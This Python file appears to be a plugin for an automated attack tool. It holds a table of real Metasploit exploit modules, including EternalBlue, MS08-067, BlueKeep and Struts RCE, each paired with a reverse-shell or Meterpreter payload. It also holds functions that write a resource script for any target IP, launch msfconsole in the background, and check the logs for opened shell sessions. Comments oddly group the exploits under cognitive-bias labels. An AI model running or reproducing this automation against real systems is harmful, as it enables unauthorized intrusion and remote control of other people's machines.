# plugins/metasploit_plugin.py

import os
import time
import subprocess
from pathlib import Path
from plugins.utils.errors import safe_open

EXPLOIT_LIBRARY = {
    # Anchoring Bias Exploits
    "ftp_vsftpd": {
        "module": "exploit/unix/ftp/vsftpd_234_backdoor",
        "payload": "cmd/unix/interact",
        "default_port": 21
    },
    "ms08_067": {
        "module": "exploit/windows/smb/ms08_067_netapi",
        "payload": "windows/meterpreter/reverse_tcp",
        "default_port": 445
    },
    "cve_2017_0144_eternalblue": {
        "module": "exploit/windows/smb/ms17_010_eternalblue",
        "payload": "windows/x64/meterpreter/reverse_tcp",
        "default_port": 445
    },

    # Confirmation Bias Exploits
    "apache_struts": {
        "module": "exploit/multi/http/struts2_content_type_ognl",
        "payload": "java/meterpreter/reverse_tcp",
        "default_port": 8080
    },
    "samba_usermap": {
        "module": "exploit/linux/samba/usermap_script",
        "payload": "cmd/unix/reverse",
        "default_port": 139
    },
    "cve_2017_5638": {
        "module": "exploit/multi/http/struts2_code_exec",
        "payload": "java/meterpreter/reverse_tcp",
        "default_port": 8080
    },

    # Overconfidence Bias Exploits
    "cve_2021_41773": {
        "module": "exploit/multi/http/apache_path_traversal",
        "payload": "cmd/unix/reverse",
        "default_port": 80
    },
    "cve_2018_10933": {
        "module": "exploit/linux/ssh/libssh_auth_bypass",
        "payload": "cmd/unix/interact",
        "default_port": 22
    },
    "cve_2019_0708_rdp_bluekeep": {
        "module": "exploit/windows/rdp/cve_2019_0708_bluekeep_rce",
        "payload": "windows/x64/meterpreter/reverse_tcp",
        "default_port": 3389
    }
}


def run_msf_attack(
    target_ip,
    exploit_name="ftp_vsftpd",
    lhost="10.0.0.100",
    lport="4444",
    log_dir="logs/metasploit"
):
    """
    Launches a Metasploit attack using a .rc script and background execution.

    Args:
        target_ip (str): The IP address of the target.
        exploit_name (str): The exploit module alias to run.
        lhost (str): Local host for reverse payload.
        lport (str): Local port for reverse payload.
        log_dir (str): Where to store .rc and log files.

    Returns:
        dict: Contains script path, log path, exploit metadata, or error if failed.
    """
    Path(log_dir).mkdir(parents=True, exist_ok=True)
    timestamp = int(time.time())
    script_path = os.path.join(log_dir, f"attack_{timestamp}.rc")
    log_path = os.path.join(log_dir, f"msf_{timestamp}.log")

    result = {
        "script": script_path,
        "log": log_path,
        "exploit": exploit_name,
        "timestamp": timestamp,
        "launched": False,
        "error": None
    }

    if exploit_name not in EXPLOIT_LIBRARY:
        result["error"] = f"[metasploit_plugin] Unknown exploit: {exploit_name}"
        return result

    module = EXPLOIT_LIBRARY[exploit_name]

    try:
        with safe_open(script_path, "w") as f:
            f.write(f"use {module['module']}\n")
            f.write(f"set RHOST {target_ip}\n")
            f.write(f"set LHOST {lhost}\n")
            f.write(f"set LPORT {lport}\n")
            f.write(f"set PAYLOAD {module['payload']}\n")
            f.write("exploit -j\n")

        subprocess.Popen(
            ["nohup", "msfconsole", "-r", script_path],
            stdout=safe_open(log_path, "w"),
            stderr=subprocess.STDOUT,
            preexec_fn=os.setpgrp
        )

        print(f"[metasploit_plugin] Launched '{exploit_name}' against {target_ip} â†’ {log_path}")
        result["launched"] = True

    except Exception as e:
        result["error"] = f"[metasploit_plugin] Launch failed: {e}"
        print(result["error"])

    return result


def parse_msf_log(log_path):
    """
    Parses a Metasploit log file to detect session success or common errors.

    Args:
        log_path (str): Full path to log file generated by Metasploit.

    Returns:
        dict: Contains 'session_opened' (bool), 'errors' list, and original log path.
    """
    outcome = {
        "session_opened": False,
        "errors": [],
        "log_path": log_path
    }

    try:
        with open(log_path, "r", encoding="utf-8", errors="ignore") as f:
            for line in f:
                lower = line.lower()
                if "meterpreter session" in lower or "command shell session" in lower:
                    outcome["session_opened"] = True
                elif "error" in lower or "failed" in lower:
                    outcome["errors"].append(line.strip())

    except Exception as e:
        outcome["errors"].append(f"Log parsing failed: {e}")

    return outcome
